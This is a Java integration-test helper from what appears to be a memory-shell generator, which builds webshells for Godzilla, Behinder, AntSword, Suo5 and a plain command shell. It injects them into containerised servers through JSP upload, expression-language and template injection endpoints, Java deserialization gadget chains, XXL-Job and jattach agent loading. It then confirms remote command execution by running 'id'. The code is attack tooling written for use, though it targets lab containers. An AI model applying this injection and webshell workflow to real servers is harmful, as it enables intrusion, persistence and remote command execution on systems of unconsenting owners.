package com.reajason.javaweb.integration;

import com.reajason.javaweb.GeneratorMain;
import com.reajason.javaweb.antsword.AntSwordManager;
import com.reajason.javaweb.behinder.BehinderManager;
import com.reajason.javaweb.godzilla.GodzillaManager;
import com.reajason.javaweb.memshell.SpringWebFluxShell;
import com.reajason.javaweb.memshell.SpringWebMvcShell;
import com.reajason.javaweb.memshell.config.*;
import com.reajason.javaweb.memshell.packer.Packers;
import com.reajason.javaweb.memshell.packer.jar.JarPacker;
import com.reajason.javaweb.suo5.Suo5Manager;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.shaded.org.apache.commons.io.FileUtils;
import org.testcontainers.shaded.org.apache.commons.lang3.StringUtils;
import org.testcontainers.utility.MountableFile;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Objects;

import static org.hamcrest.CoreMatchers.anyOf;
import static org.hamcrest.CoreMatchers.containsString;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * @author ReaJason
 * @since 2024/12/5
 */
@Slf4j
public class ShellAssertionTool {

    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packers packer) {
        testShellInjectAssertOk(url, server, shellType, shellTool, targetJdkVersion, packer, null);
    }

    @SneakyThrows
    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packers packer, GenericContainer<?> container) {
        String shellUrl = url + "/test";

        String urlPattern = null;
        if (shellType.endsWith(Constants.SERVLET)
                || shellType.endsWith(SpringWebMvcShell.CONTROLLER_HANDLER)
                || shellType.equals(SpringWebFluxShell.HANDLER_METHOD)
                || shellType.equals(SpringWebFluxShell.HANDLER_FUNCTION)
        ) {
            urlPattern = "/" + shellTool + shellType + packer.name();
            shellUrl = url + urlPattern;
        }

        GenerateResult generateResult = generate(urlPattern, server, shellType, shellTool, targetJdkVersion, packer);

        String content = null;
        if (packer.getInstance() instanceof JarPacker) {
            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult);
            Path tempJar = Files.createTempFile("temp", "jar");
            Files.write(tempJar, bytes);
            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
            container.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
            FileUtils.deleteQuietly(tempJar.toFile());
            String pidInContainer = container.execInContainer("bash", "/fetch_pid.sh").getStdout();
            assertDoesNotThrow(() -> Long.parseLong(pidInContainer));
            String stdout = container.execInContainer("/jattach", pidInContainer, "load", "instrument", "false", jarPath).getStdout();
            log.info("attach result: {}", stdout);
            assertThat(stdout, anyOf(
                    containsString("ATTACH_ACK"),
                    containsString("JVM response code = 0")
            ));
        } else {
            content = packer.getInstance().pack(generateResult);
            assertInjectIsOk(url, shellType, shellTool, content, packer, container);
        }

        switch (shellTool) {
            case Godzilla:
                testGodzillaIsOk(shellUrl, ((GodzillaConfig) generateResult.getShellToolConfig()));
                break;
            case Command:
                testCommandIsOk(shellUrl, ((CommandConfig) generateResult.getShellToolConfig()));
                break;
            case Behinder:
                testBehinderIsOk(shellUrl, ((BehinderConfig) generateResult.getShellToolConfig()));
                break;
            case Suo5:
                testSuo5IsOk(shellUrl, ((Suo5Config) generateResult.getShellToolConfig()));
                break;
            case AntSword:
                testAntSwordIsOk(shellUrl, ((AntSwordConfig) generateResult.getShellToolConfig()));
                break;
        }
    }

    public static void testGodzillaIsOk(String entrypoint, GodzillaConfig shellConfig) {
        try (GodzillaManager godzillaManager = GodzillaManager.builder()
                .entrypoint(entrypoint).pass(shellConfig.getPass())
                .key(shellConfig.getKey()).header(shellConfig.getHeaderName()
                        , shellConfig.getHeaderValue()).build()) {
            assertTrue(godzillaManager.start());
            assertTrue(godzillaManager.test());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @SneakyThrows
    public static void testCommandIsOk(String entrypoint, CommandConfig shellConfig) {
        OkHttpClient okHttpClient = new OkHttpClient();
        HttpUrl url = Objects.requireNonNull(HttpUrl.parse(entrypoint))
                .newBuilder()
                .addQueryParameter(shellConfig.getParamName(), "id")
                .build();
        Request request = new Request.Builder()
                .url(url)
                .get().build();

        try (Response response = okHttpClient.newCall(request).execute()) {
            String res = response.body().string();
            System.out.println(res.trim());
            assertTrue(res.contains("uid="));
        }
    }

    public static void testBehinderIsOk(String entrypoint, BehinderConfig shellConfig) {
        BehinderManager behinderManager = BehinderManager.builder()
                .entrypoint(entrypoint).pass(shellConfig.getPass())
                .header(shellConfig.getHeaderName()
                        , shellConfig.getHeaderValue()).build();
        assertTrue(behinderManager.test());
    }

    public static void testSuo5IsOk(String entrypoint, Suo5Config shellConfig) {
        assertTrue(Suo5Manager.test(entrypoint, shellConfig.getHeaderValue()));
    }

    public static void testAntSwordIsOk(String entrypoint, AntSwordConfig shellConfig) {
        AntSwordManager antSwordManager = AntSwordManager.builder()
                .entrypoint(entrypoint)
                .pass(shellConfig.getPass())
                .header(shellConfig.getHeaderName()
                        , shellConfig.getHeaderValue()).build();
        assertTrue(antSwordManager.getInfo().contains("ok"));
    }

    public static GenerateResult generate(String urlPattern, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packers packer) {
        InjectorConfig injectorConfig = new InjectorConfig();
        if (StringUtils.isNotBlank(urlPattern)) {
            injectorConfig.setUrlPattern(urlPattern);
        }

        ShellConfig shellConfig = ShellConfig.builder()
                .server(server)
                .shellTool(shellTool)
                .shellType(shellType)
                .targetJreVersion(targetJdkVersion)
                .debug(true)
                .build();

        ShellToolConfig shellToolConfig = null;
        String uniqueName = shellTool + shellType + packer.name();
        switch (shellTool) {
            case Godzilla:
                String godzillaPass = "pass";
                String godzillaKey = "key";
                shellToolConfig = GodzillaConfig.builder()
                        .pass(godzillaPass).key(godzillaKey)
                        .headerName("User-Agent").headerValue(uniqueName)
                        .build();
                log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, godzillaPass, godzillaKey, uniqueName);
                break;
            case Command:
                shellToolConfig = CommandConfig.builder()
                        .paramName(uniqueName)
                        .build();
                log.info("generated {} command shell with paramName: {}", shellType, uniqueName);
                break;
            case Behinder:
                String behinderPass = "pass";
                shellToolConfig = BehinderConfig.builder()
                        .pass(behinderPass)
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} behinder with pass: {}, headerValue: {}", shellType, behinderPass, uniqueName);
                break;
            case Suo5:
                shellToolConfig = Suo5Config.builder()
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} suo5 with headerValue: {}", shellType, uniqueName);
                break;
            case AntSword:
                String antPassword = "ant";
                shellToolConfig = AntSwordConfig.builder()
                        .pass(antPassword)
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} antSword with pass: {}, headerValue: {}", shellType, antPassword, uniqueName);
                break;
        }
        return GeneratorMain.generate(shellConfig, injectorConfig, shellToolConfig);
    }

    public static void assertInjectIsOk(String url, String shellType, ShellTool shellTool, String content, Packers packer, GenericContainer<?> container) {
        switch (packer) {
            case JSP -> {
                String uploadEntry = url + "/upload";
                String filename = shellType + shellTool + ".jsp";
                String shellUrl = url + "/" + filename;
                VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                VulTool.urlIsOk(shellUrl);
            }
            case JSPX -> {
                String uploadEntry = url + "/upload";
                String filename = shellType + shellTool + ".jspx";
                String shellUrl = url + "/" + filename;
                VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                VulTool.urlIsOk(shellUrl);
            }
            case ScriptEngine -> VulTool.postData(url + "/js", content);
            case EL -> VulTool.postData(url + "/el", content);
            case SpEL -> VulTool.postData(url + "/spel", content);
            case OGNL -> VulTool.postData(url + "/ognl", content);
            case MVEL -> VulTool.postData(url + "/mvel", content);
            case JXPath -> VulTool.postData(url + "/jxpath", content);
            case JEXL -> VulTool.postData(url + "/jexl2", content);
            case Aviator -> VulTool.postData(url + "/aviator", content);
            case Groovy -> VulTool.postData(url + "/groovy", content);
            case Rhino -> VulTool.postData(url + "/rhino", content);
            case BeanShell -> VulTool.postData(url + "/bsh", content);
            case JinJava -> VulTool.postData(url + "/jinjava", content);
            case Freemarker -> VulTool.postData(url + "/freemarker", content);
            case Velocity -> VulTool.postData(url + "/velocity", content);
            case JavaDeserialize -> VulTool.postData(url + "/java_deserialize", content);
            case JavaCommonsBeanutils16 -> VulTool.postData(url + "/java_deserialize/cb161", content);
            case JavaCommonsBeanutils17 -> VulTool.postData(url + "/java_deserialize/cb170", content);
            case JavaCommonsBeanutils18 -> VulTool.postData(url + "/java_deserialize/cb183", content);
            case JavaCommonsBeanutils19 -> VulTool.postData(url + "/java_deserialize/cb194", content);
            case JavaCommonsBeanutils110 -> VulTool.postData(url + "/java_deserialize/cb110", content);
            case Base64 -> VulTool.postData(url + "/b64", content);
            case XxlJob -> VulTool.xxlJobExecutor(url + "/run", content);
            default -> throw new IllegalStateException("Unexpected value: " + packer);
        }
    }
}
